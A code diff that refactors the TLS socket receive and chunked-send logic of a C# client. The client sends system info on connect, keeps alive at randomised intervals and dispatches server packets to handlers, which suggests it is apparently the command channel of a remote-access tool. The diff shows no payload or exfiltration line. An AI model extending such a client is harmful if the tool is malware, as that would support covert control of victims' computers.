@@ -25,9 +25,9 @@ namespace Client.Connection
         public static Socket TcpClient { get; set; } //Main socket
         public static SslStream SslClient { get; set; } //Main SSLstream
         private static byte[] Buffer { get; set; } //Socket buffer
-        private static long Buffersize { get; set; } //Recevied size
+        private static long HeaderSize { get; set; } //Recevied size
+        private static long Offset { get; set; } // Buffer location
         private static Timer KeepAlive { get; set; } //Send Performance
-        private static MemoryStream MS { get; set; } //Socket MS
         public static bool IsConnected { get; set; } //Check socket status
         private static object SendSync { get; } = new object(); //Sync send
         private static Timer Ping { get; set; } //Send ping interval
@@ -89,11 +89,12 @@ namespace Client.Connection
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                     SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                    Buffer = new byte[4];
-                    MS = new MemoryStream();
+                    HeaderSize = 4;
+                    Buffer = new byte[HeaderSize];
+                    Offset = 0;
                     Send(IdSender.SendInfo());
                     KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 60 * 1000));
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
                 {
@@ -131,7 +132,6 @@ namespace Client.Connection
                 KeepAlive?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
-                MS?.Dispose();
             }
             catch { }
         }
@@ -148,34 +148,40 @@ namespace Client.Connection
                 int recevied = SslClient.EndRead(ar);
                 if (recevied > 0)
                 {
-                    MS.Write(Buffer, 0, recevied);
-                    if (MS.Length == 4)
+                    Offset += recevied;
+                    HeaderSize -= recevied;
+                    if (HeaderSize == 0)
                     {
-                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
-                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
-                        MS.Dispose();
-                        MS = new MemoryStream();
-                        if (Buffersize > 0)
+                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
+                        Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
+                        if (HeaderSize > 0)
                         {
-                            Buffer = new byte[Buffersize];
-                            while (MS.Length != Buffersize)
+                            Offset = 0;
+                            Buffer = new byte[HeaderSize];
+                            while (HeaderSize != 0)
                             {
-                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
-                                if (rc == 0)
+                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
+                                if (rc <= 0 || HeaderSize < 0)
                                 {
                                     IsConnected = false;
                                     return;
                                 }
-                                MS.Write(Buffer, 0, rc);
+                                Offset += rc;
+                                HeaderSize -= rc;
                             }
                             Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
-                            thread.Start(MS.ToArray());
-                            Buffer = new byte[4];
-                            MS.Dispose();
-                            MS = new MemoryStream();
+                            thread.Start(Buffer);
+                            Offset = 0;
+                            HeaderSize = 4;
+                            Buffer = new byte[HeaderSize];
                         }
                     }
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                    else if (HeaderSize < 0)
+                    {
+                        IsConnected = false;
+                        return;
+                    }
+                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
                 {
@@ -208,25 +214,21 @@ namespace Client.Connection
                     if (msg.Length > 1000000) //1mb
                     {
                         Debug.WriteLine("send chunks");
-                        int chunkSize = 50 * 1024;
-                        byte[] chunk = new byte[chunkSize];
-                        using (MemoryStream buffereReader = new MemoryStream(msg))
+                        using (MemoryStream memoryStream = new MemoryStream(msg))
                         {
-                            BinaryReader binaryReader = new BinaryReader(buffereReader);
-                            int bytesToRead = (int)buffereReader.Length;
-                            do
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                             {
-                                chunk = binaryReader.ReadBytes(chunkSize);
-                                bytesToRead -= chunkSize;
-                                SslClient.Write(chunk, 0, chunk.Length);
-                                SslClient.Flush();
-                            } while (bytesToRead > 0);
-
-                            binaryReader.Dispose();
+                                TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                SslClient.Write(chunk, 0, read);
+                            }
                         }
                     }
                     else
                     {
+                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                         SslClient.Write(msg, 0, msg.Length);
                         SslClient.Flush();
                     }
